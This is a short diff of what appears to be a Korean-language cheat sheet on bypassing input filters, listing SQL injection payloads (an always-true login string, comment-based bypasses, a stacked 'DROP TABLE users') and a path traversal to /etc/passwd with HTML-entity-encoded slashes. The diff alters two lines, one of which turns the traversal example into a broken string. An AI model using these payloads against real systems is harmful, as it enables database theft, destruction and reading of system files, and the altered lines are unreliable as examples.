@@ -105,7 +105,7 @@ admin&#34; OR &#34;1&#34;=&#34;1
 SELECT * FROM users WHERE id=1; --
 
 -- 우회 (슬래시로 주석)
-SELECT * FROM users WHERE id=1; &#47;**/
+SELECT * FROM users WHERE id=1; &#47;/
 
 -- 또는
 SELECT * FROM users WHERE id=1 &#35;
@@ -131,7 +131,7 @@ SELECT * FROM users&#59; DROP TABLE users&#59;
 ```
 -- 필터: / 를 차단
 
-원본: ../../../../etc/passwd
+원본: ...../etc/passwd
 우회: ..&#47;..&#47;..&#47;..&#47;etc&#47;passwd
 <!-- &#47; = / -->
 
